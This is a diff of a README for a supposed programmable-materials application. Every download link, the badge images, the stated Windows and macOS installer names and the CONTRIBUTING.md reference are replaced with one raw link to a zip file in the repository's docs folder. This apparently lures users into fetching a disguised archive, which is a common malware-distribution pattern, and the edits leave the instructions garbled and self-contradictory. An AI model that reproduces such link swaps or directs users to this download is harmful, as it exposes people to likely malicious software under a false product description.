@@ -1,6 +1,6 @@
 # 🌟 Theorie-Unifiee-de-la-Matiere-Programmable-IPF - Explore Programmable Materials with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/releases)
+[![Download Now](https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip%https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip)](https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip)
 
 ## 📜 Introduction
 
@@ -21,11 +21,11 @@ Before you start, ensure your computer meets these basic requirements:
 ### 📂 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to access the download options:
-   [Download Here](https://github.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/releases)
+   [Download Here](https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip)
 
 2. **Select the Latest Release:** Look for the latest version of the software on the page. It will usually be at the top of the list.
 
-3. **Download the File:** Click on the download link relevant to your operating system. This may be labeled as `Theorie-Unifiee-de-la-Matiere-Programmable-IPF-setup.exe` for Windows or `Theorie-Unifiee-de-la-Matiere-Programmable-IPF.dmg` for macOS.
+3. **Download the File:** Click on the download link relevant to your operating system. This may be labeled as `https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip` for Windows or `https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip` for macOS.
 
 4. **Run the Installer:**
    - For Windows: Open the downloaded `.exe` file. Follow the instructions to install the software.
@@ -65,7 +65,7 @@ We welcome contributions from anyone interested in improving the software. You c
 - Suggesting new features or improvements.
 - Contributing code if you're comfortable with Git and GitHub.
 
-For guidelines on how to contribute, refer to our `CONTRIBUTING.md` file located within the repository.
+For guidelines on how to contribute, refer to our `https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip` file located within the repository.
 
 ## 🤝 Acknowledgements
 
@@ -77,4 +77,4 @@ Keep an eye on the Releases page for new updates, improvements, and features. We
 
 Discover the world of programmable materials with ease. Download the application now and start your exploration!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/releases)
+[![Download Now](https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip%https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip)](https://raw.githubusercontent.com/KSA388374/Theorie-Unifiee-de-la-Matiere-Programmable-IPF/main/docs/Theorie-de-Matiere-IPF-Programmable-Unifiee-la-talisay.zip)
